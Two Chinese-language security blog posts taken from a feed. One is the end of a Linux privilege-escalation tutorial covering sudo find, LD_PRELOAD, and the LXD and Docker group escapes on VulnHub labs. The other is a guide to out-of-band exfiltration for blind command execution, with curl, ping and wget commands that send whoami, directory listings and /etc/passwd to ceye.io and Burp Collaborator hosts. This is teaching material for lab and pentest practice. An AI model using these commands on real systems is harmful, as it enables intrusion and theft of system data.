class="headerlink" title="过程"></a><strong>过程</strong></h3><p>##看一下权限设置（可以用命令也可以用脚本工具）  </p><pre><code class="hljs">vim /etc/sudoers  This file MUST be edited with the &#39;visudo&#39; command as root.  Please consider adding local content in /etc/sudoers.d/ instead of  directly modifying this file.  See the man page for details on how to write a sudoers file.  Defaultsenv\_reset  Defaultsmail\_badpass  Defaultssecure\_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;  Defaultsuse\_pty  This preserves proxy settings from user environments of root  equivalent users (group sudo)  #Defaults:%sudo env\_keep += &quot;http\_proxy https\_proxy ftp\_proxy all\_proxy no\_proxy&quot;  This allows running arbitrary commands, but so does ALL, and it means  different sudoers have their choice of editor respected.  #Defaults:%sudo env\_keep += &quot;EDITOR&quot;  Completely harmless preservation of a user preference.  #Defaults:%sudo env\_keep += &quot;GREP\_COLOR&quot;  While you shouldn&#39;t normally run git as root, you need to with etckeeper  #Defaults:%sudo env\_keep += &quot;GIT\_AUTHOR\_\* GIT\_COMMITTER\_\*&quot;  Per-user preferences; root won&#39;t have sensible values for them.  #Defaults:%sudo env\_keep += &quot;EMAIL DEBEMAIL DEBFULLNAME&quot;  &quot;sudo scp&quot; or &quot;sudo rsync&quot; should be able to use your SSH agent.  #Defaults:%sudo env\_keep += &quot;SSH\_AGENT\_PID SSH\_AUTH\_SOCK&quot;  Ditto for GPG agent  #Defaults:%sudo env\_keep += &quot;GPG\_AGENT\_INFO&quot;  Host alias specification  User alias specification  Cmnd alias specification  User privilege specification  rootALL=(ALL:ALL) ALL  Allow members of group sudo to execute any command  %sudoALL=(ALL:ALL) ALL  See sudoers(5) for more information on &quot;@include&quot; directives:  @includedir /etc/sudoers.d  </code></pre><p> </p><p>然后把命令加进去(这个命令的意思)</p><pre><code class="hljs">Defaults env\_keep += LD\_PRELOAD</code></pre><p>加到下面这一块</p><pre><code class="hljs">This file MUST be edited with the &#39;visudo&#39; command as root.  Please consider adding local content in /etc/sudoers.d/ instead of  directly modifying this file.  See the man page for details on how to write a sudoers file.  Defaultsenv\_reset  Defaultsmail\_badpass  Defaultssecure\_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;  Defaultsuse\_pty  Defaults env\_keep += LD\_PRELOAD</code></pre><p>加入用户权限</p><pre><code class="hljs">mkbk ALL=(ALL:ALL) NOPASSWD: /usr/bin/find</code></pre><p>前面提过sudo的find提权就不细说了</p><pre><code class="hljs">$ sudo find . -exec /bin/sh \\; -quitid用户id=0(root) 组id=0(root) 组=0(root)  </code></pre><p> </p><h2 id="Linux系统提权-普通用户-LXD容器"><a href="#Linux系统提权-普通用户-LXD容器" class="headerlink" title="Linux系统提权-普通用户-LXD容器"></a><strong>Linux系统提权-普通用户-LXD容器</strong></h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>在讲述以下三种提权之前，我们先搞清楚LXD、LXC和docker三种容器的区别。</p><h3 id="LXD和LXC"><a href="#LXD和LXC" class="headerlink" title="LXD和LXC"></a><strong>LXD和LXC</strong></h3><p>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于Chroot和完整开发的虚拟机之间，LXC可以创建一个跟正常Linux操作系统十分接近的环境，但是不需要使用到单独的内核资源。</p><p>Linux Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前Docker也使用过。LXD使用了稳定的LXC API来完成所有的后台容器管理工作，并且增加了REST API支持，更进一步地提升了用户体验度。</p><h3 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a><strong>容器技术</strong></h3><p>所谓的容器技术，也就是在主机操作系统中创建一个隔离的环境，以允许某个进程或应用程序在一个不影响主操作系统以及其他进程的环境下运行。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>LXD是拉应用的容器，LXC是拉系统的容器</p><p>LXD和LXC是Linux自带的容器，而docke容器是第三方容器，LXD是一个root进程，它可以负责执行任意用户的LXD UNIX套接字写入访问操作。而且在某些情况下，LXD甚至都不会对调用它的用户权限进行检查和匹配，现在社区也有很多种方法可以利用LXD的这种特性来实施攻击。</p><p>其中的一项技术就是使用LXD API来将目标主机的根文件系统加载进一个容器中，而本文讨论的也是这项技术。一旦成功，攻击者就可以将低权限的用户提升为root权限，并且能够在不受任何限制的情况下访问目标系统的各种数据资源。</p><p>当然大部分情况不会出现该种提权，但是在面试和ctf、内网攻防比赛可能会出现该种提权</p><h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>废话不多说直接开干</p><p>复现靶场</p><p><a href="https://www.vulnhub.com/entry/ai-web-2,357/">https://www.vulnhub.com/entry/ai-web-2,357/</a></p><p>通过ssh连接<br>账号：n0nr00tuser<br>Pass:zxowieoi4sdsadpEClDws1sf  </p><p>入口打点我就不讲了有wp  </p><p>进去看见权限后面跟了一个lxd，如果是docker就会跟一个docker  </p><pre><code class="hljs">n0nr00tuser@aiweb2host:/var/www/html$ id  uid=1001(n0nr00tuser) gid=1001(n0nr00tuser) groups=1001(n0nr00tuser),108(lxd)  </code></pre><p>不能通过命令写入一句话木马到网站目录因为没有权限<br>经过测试&#x2F;tmp路径有权限写入我们可以上传提权检测脚本  </p><p>我用的是LinEnum项目  </p><p>检测出来 </p><pre><code class="hljs">[+] We&#39;re a member of the (lxd) group - could possibly misuse these rights!  uid=1001(n0nr00tuser) gid=1001(n0nr00tuser) groups=1001(n0nr00tuser),108(lxd)  </code></pre><p> </p><p>简单说一下流程</p><p>我们先传一个镜像过去，很小只有3mb，如果可以访问外网我们也可以下载一个镜像</p><p><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p><p>然后创建容器，挂载磁盘，进入容器，进入目录提权</p><p>先用lxc命令创建一个镜像，并且创建一个test用户 </p><pre><code class="hljs">n0nr00tuser@aiweb2host:/tmp$ lxc image import ./alpine-v3.13-x86\_64-20210218\_0139.tar.gz --alias test  Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b  </code></pre><p>再对这个镜像进行初始化  </p><pre><code class="hljs">n0nr00tuser@aiweb2host:/tmp$ lxc init test test -c security.privileged=true  reating test  </code></pre><p>设置一下镜像的路径  </p><pre><code class="hljs">lxc config device add test test disk source=/ path=/mnt/root recursive=true  </code></pre><p>解释一下这条命令 </p><pre><code class="hljs">source=/ path=/mnt/root   这个的意思是把镜像的/mnt/root   代表根目录  /mnt/root/   而进入镜像以后根目录就是这个  </code></pre><p>启动镜像  </p><pre><code class="hljs">lxc start test  </code></pre><p>然后进入镜像弹回一个终端  </p><pre><code class="hljs">xc exec test /bin/sh  </code></pre><p>提权成功  </p><pre><code class="hljs">n0nr00tuser@aiweb2host:/tmp$ lxc exec test /bin/sh  ~ # id  uid=0(root) gid=0(root)  </code></pre><p> </p><h2 id="Linux系统提权-普通用户-Docker容器"><a href="#Linux系统提权-普通用户-Docker容器" class="headerlink" title="Linux系统提权-普通用户-Docker容器"></a><strong>Linux系统提权-普通用户-Docker容器</strong></h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>docker和lxd提权原理过程差不多，所以就不细说了，就是一些命令的不同</p><h2 id="docker容器内用户权限不受限"><a href="#docker容器内用户权限不受限" class="headerlink" title="docker容器内用户权限不受限"></a><strong>docker容器内用户权限不受限</strong></h2><p>我们知道，用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。</p><p>正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作。</p><h2 id="docker文件映射方便容器内外文件共享"><a href="#docker文件映射方便容器内外文件共享" class="headerlink" title="docker文件映射方便容器内外文件共享"></a><strong>docker文件映射方便容器内外文件共享</strong></h2><p>在我们创建容器的时候，docker提供了一个<code>-v</code>选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。</p><p>然而便利倒是有了，但潜在了风险也是可想而知。</p><p>结合上面的两点便利，笔者想到一种普通用户借助docker突破权限的限制，达到本地提权的目的。</p><h3 id="Docker本地提权条件"><a href="#Docker本地提权条件" class="headerlink" title="Docker本地提权条件:"></a><strong>Docker本地提权条件:</strong></h3><p>1、已经获得Shell</p><p>2、用户属于docker组</p><h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a><strong>靶场</strong></h3><p><a href="https://www.vulnhub.com/entry/chill-hack-1,622/">https://www.vulnhub.com/entry/chill-hack-1,622/</a></p><p>1、入口点：</p><p>User: anurodh</p><p>Pass: !d0ntKn0wmYp@ssw0rd</p><h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>检测及利用：  </p><pre><code class="hljs">./LinEnum.sh  </code></pre><p>创建容器，挂载磁盘，进入容器，进入目录提权  </p><pre><code class="hljs">docker run -v /:/mnt -it alpine  cd /mnt/root</code></pre><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>Linux提权总的来说分为三块：内核溢出提权，SUID&amp;SUDO提权，虚拟镜像提权。本章节讲了这么多方法，万变不离其宗的就是权限分配不当，有许多方法是联动SUID&amp;SUDO提权，只是中间过程绕了一下，讲这么多提权方法是为了应对面试和内网比赛，在实战中更可能遇到的是SUID&amp;SUDO提权和内核提权，应该着重关注学习</p><p>完结！！！！</p><p>原文：<a href="https://mp.weixin.qq.com/s/xmCt7qGD78ROTdfs_LTD1g">Linux提权（二）</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>内网横向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>带外攻击OOB（RCE无回显骚思路总结）</title>
    <link href="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/"/>
    <url>/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h2><h3 id="1-带内攻击"><a href="#1-带内攻击" class="headerlink" title="1.带内攻击"></a><strong>1.带内攻击</strong></h3><p>向服务器提交一个 payload，而服务器响应给我们相关的 response 信息。大家都叫它带内攻击，这些理论的东西，我们简单理解就好，这里我们就理解成<strong>单挑通信的通道为带内攻击，也就是整个测试过程或者说是交互过程，中间没有其外部的服务器参与，只有自己和目标服务器，那么就叫带内</strong>。</p><h3 id="2-带外攻击（OOB）"><a href="#2-带外攻击（OOB）" class="headerlink" title="2.带外攻击（OOB）"></a><strong>2.带外攻击（OOB）</strong></h3><p><strong>服务器用来测试盲的各种漏洞的话，则需要我们外部的独立服务器参数，也就是带入了外部的服务器，我们叫它带外攻击。</strong>这里简单的提了一下这个带内和带外，我们只要理解其过程即可。</p><h3 id="3-带外数据"><a href="#3-带外数据" class="headerlink" title="3.带外数据"></a><strong>3.带外数据</strong></h3><p>传输层协议使用带外数据（out-of-band，OOB）来发送一些重要的数据，如果通信一方有重要的数据需要通知对方时，协议能够将这些数据快速地发送到对方。为了发送这些数据，协议一般不使用与普通数据相同的通道，而是使用另外的通道。linux系统的套接字机制支持低层协议发送和接受带外数据。但是TCP协议没有真正意义上的带外数据。为了发送重要协议，TCP提供了一种称为紧急模式（urgent mode）的机制。TCP协议在数据段中设置URG位，表示进入紧急模式。接收方可以对紧急模式采取特殊的处理。很容易看出来，这种方式数据不容易被阻塞，并且可以通过在我们的服务器端程序里面捕捉SIGURG信号来及时接受数据。这正是我们所要求的效果。</p><p>由于TCP协议每次只能发送和接受带外数据一个字节，所以，我们可以通过设置一个数组，利用发送数组下标的办法让服务器程序能够知道自己要监听的端口以及要连接的服务器IP&#x2F;port。由于限定在1个字节，所以我们最多只能控制255个port的连接，255个内网机器（不过同一子网的机器不会超过255J），同样也只能控制255个监听端口，不过这些已经足够了。</p><h3 id="4-盲"><a href="#4-盲" class="headerlink" title="4.盲"></a><strong>4.盲</strong></h3><p><strong>程序不进行详细的回显信息，而只是返回对或者错时，我们都可以叫它盲</strong>。我们在做渗透测试的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，例如提交反馈表单，需要等管理员打开查看提交信息时才会触发，或者是盲注跨站，盲打 XSS 这种。再例如 SSRF，如果程序不进行回显任何信息，而只提示你输入的是否合法，那么也无法直接判断程序存在 SSRF 漏洞，我们可以叫盲 SSRF。再例如 XXE，引入外部文件时，如果程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在 XXE 漏洞，我们也可以叫盲 XXE。</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/001.png"></p><h2 id="基本回显思路"><a href="#基本回显思路" class="headerlink" title="基本回显思路"></a><strong>基本回显思路</strong></h2><h3 id="1-对于出网机器"><a href="#1-对于出网机器" class="headerlink" title="1.对于出网机器"></a><strong>1.对于出网机器</strong></h3><h4 id="使用http传输，如wget，curl，certutil将回显信息爬出"><a href="#使用http传输，如wget，curl，certutil将回显信息爬出" class="headerlink" title="使用http传输，如wget，curl，certutil将回显信息爬出"></a><strong>使用http传输，如wget，curl，certutil将回显信息爬出</strong></h4><p>   <strong>1.1 优点：</strong></p><p>方便，回显全。</p><p>   <strong>1.2 缺点：</strong></p><p>对于不出网服务器没有办法传输，同时需要了解其返回包字段信息，需要使用返回包字段将回显信息带出</p><h3 id="2-对于不出网机器"><a href="#2-对于不出网机器" class="headerlink" title="2.对于不出网机器"></a><strong>2.对于不出网机器</strong></h3><h4 id="使用DNS传输，ICMP传输，powershell中的wget，curl等传输"><a href="#使用DNS传输，ICMP传输，powershell中的wget，curl等传输" class="headerlink" title="使用DNS传输，ICMP传输，powershell中的wget，curl等传输"></a><strong>使用DNS传输，ICMP传输，powershell中的wget，curl等传输</strong></h4><p>    <strong>2.1 优点：</strong></p><p>不出网机器可以传输</p><p>    <strong>2.2 缺点：</strong></p><p>1.回显是一条条执行，需要将回显结果拼接解码，回显信息比较麻烦</p><p>          2.短回显可以使用DNS传输，长回显大部分带出需要powershell搭配，但杀毒软件往往禁用powershell，因此利用条件较苛刻</p><h3 id="3-在线网站DNS-HTTP管道解析"><a href="#3-在线网站DNS-HTTP管道解析" class="headerlink" title="3.在线网站DNS&#x2F;HTTP管道解析"></a><strong>3.在线网站DNS&#x2F;HTTP管道解析</strong></h3><p>经常在拿下shell的时候碰到命令执行无回显的情况，因此为了解决命令执行无回显时，可以借助DNS管道解析来让命令回显</p><p>登录<strong>ceye.io</strong></p><blockquote><p>各操作系统的使用方法：<a href="https://www.freesion.com/article/3526121510/">https://www.freesion.com/article/3526121510/</a></p></blockquote><h4 id="HTTP带外攻击"><a href="#HTTP带外攻击" class="headerlink" title="HTTP带外攻击"></a><strong>HTTP带外攻击</strong></h4><p>linux可以使用以下方法：</p><p><strong>1.curl</strong></p><p>通过curl远程命令执行RCE去对靶机执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">通过http记录查看是否执行（最好执行两次），curl走http协议<br>curl http://ip.port.XXXXXX.ceye.io/`whoami`<br>curl `whoami`.XXXXXX.ceye.io<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/002.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/003.png"></p><p><strong>2.sed</strong></p><p><strong>如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl http://ip.port.XXXXXX.ceye.io/`ls -al|sed -n &#x27;2p&#x27;`<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/004.png"></p><p><strong>使用base64传输</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl http://ip.port.XXXXXX.ceye.io/`ls -al|sed -n &#x27;2p&#x27;|base64`   <br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/005.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/006.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/007.png"></p><h4 id="DNS带外攻击"><a href="#DNS带外攻击" class="headerlink" title="DNS带外攻击"></a><strong>DNS带外攻击</strong></h4><p><strong>通过DNS记录查看是否执行（最好执行两次），ping走的是DNS协议</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">ping `whoami`.ip.port.XXXXXXX.ceye.io<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/008.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/009.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/010.png"></p><p><strong>说明使用DNS管道解析还是比较鸡肋的，只适合单条的短信息回显，有点作用。</strong></p><p>DNS管道解析的扩展，结合php命令执行可以使用这种方式进行回显，使用sed命令令回显变长：</p><p>执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al`<br></code></pre></td></tr></table></figure><p>结果：<a href="http://snrkgl.ceye.io/total">http://snrkgl.ceye.io/total</a></p><p>看起来只能带出第一行，所以我们需要sed命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al | sed -n &#x27;2p&#x27;`<br></code></pre></td></tr></table></figure><p>结果：<a href="http://xxxxxx.ceye.io/drwxr-xr-x">http://XXXXXX.ceye.io/drwxr-xr-x</a></p><p>发现空格不能被带出来，用base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">解码：http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al | sed -n &#x27;2p&#x27;|base64`<br></code></pre></td></tr></table></figure><p>结果：<a href="http://xxxxxx.ceye.io/ZHJ3eHIteHIteCAyIHJvb3Qgcm9vdCA0MDk2IERlYyAyNyAxNDo1OSAuCg==">http://XXXXXX.ceye.io/ZHJ3eHIteHIteCAyIHJvb3Qgcm9vdCA0MDk2IERlYyAyNyAxNDo1OSAuCg==</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">解码：drwxr-xr-x 2 root root 4096 Dec 27 14:59 .<br></code></pre></td></tr></table></figure><p>若有的时候长度太大，cut来分割字符(第一个字符下标为1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al |cut -c 3-10`<br></code></pre></td></tr></table></figure><h3 id="4-burpsuit-Collaborator-Client模块回显（带外攻击OOB）"><a href="#4-burpsuit-Collaborator-Client模块回显（带外攻击OOB）" class="headerlink" title="4.burpsuit Collaborator Client模块回显（带外攻击OOB）"></a><strong>4.burpsuit Collaborator Client模块回显（带外攻击OOB）</strong></h3><p>打开 collaborator client</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/011.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/012.png"></p><p>利用远程命令执行，或直接在靶机上执行命令：意思是发送whoami信息回显至burp的二级域名地址，回显过来</p><h4 id="1-第一种命令格式"><a href="#1-第一种命令格式" class="headerlink" title="1.第一种命令格式"></a><strong>1.第一种命令格式</strong></h4><p><strong>通过DNS记录查看是否执行（最好执行两次），ping走的是DNS协议</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl `whoami`.wyyysg1fi9svq8zgf0g11dz80z6pue.burpcollaborator.net<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/013.png"></p><p><strong>查看burp模块，DNS隧道解析结果</strong></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/014.png"></p><p><strong>http隧道回显信息</strong></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/015.png"></p><h4 id="2-第二种命令格式"><a href="#2-第二种命令格式" class="headerlink" title="2.第二种命令格式"></a><strong>2.第二种命令格式</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl http://n7vp17a6r01mzz87orpsa48z9qfh36.burpcollaborator.net/`whoami`<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/016.png"></p><h4 id="DNS记录中无回显"><a href="#DNS记录中无回显" class="headerlink" title="DNS记录中无回显"></a><strong>DNS记录中无回显</strong></h4><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/017.png"></p><h4 id="http中有回显"><a href="#http中有回显" class="headerlink" title="http中有回显"></a><strong>http中有回显</strong></h4><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/018.png"></p><h4 id="3-第三种命令执行格式"><a href="#3-第三种命令执行格式" class="headerlink" title="3.第三种命令执行格式"></a><strong>3.第三种命令执行格式</strong></h4><p>linux系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">ping `whoami`.ip.port.ttq72fceob0yxwq9342c4yuo2f85wu.burpcollaborator.net<br></code></pre></td></tr></table></figure><p>windows系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">ping %whoami%.ip.port.ttq72fceob0yxwq9342c4yuo2f85wu.burpcollaborator.net<br></code></pre></td></tr></table></figure><hr><h2 id="Linux的应用"><a href="#Linux的应用" class="headerlink" title="Linux的应用"></a><strong>Linux的应用</strong></h2><h3 id="1-http传输"><a href="#1-http传输" class="headerlink" title="1.http传输"></a><strong>1.http传输</strong></h3><h4 id="1-1-wget传输"><a href="#1-1-wget传输" class="headerlink" title="1.1 wget传输"></a><strong>1.1 wget传输</strong></h4><p><strong>使用wget将命令回显信息通过包头数据字符串User-Agent传输至攻击服务器上，xargs echo–n代表去掉各个分隔符，换行符等符号输出</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">wget --header=&quot;User-Agent: $(cat /etc/passwd | xargs echo–n)&quot; http://6rych16irk3064ztjoo9ufasuj0do2.burpcollaborator.net<br></code></pre></td></tr></table></figure><p><img 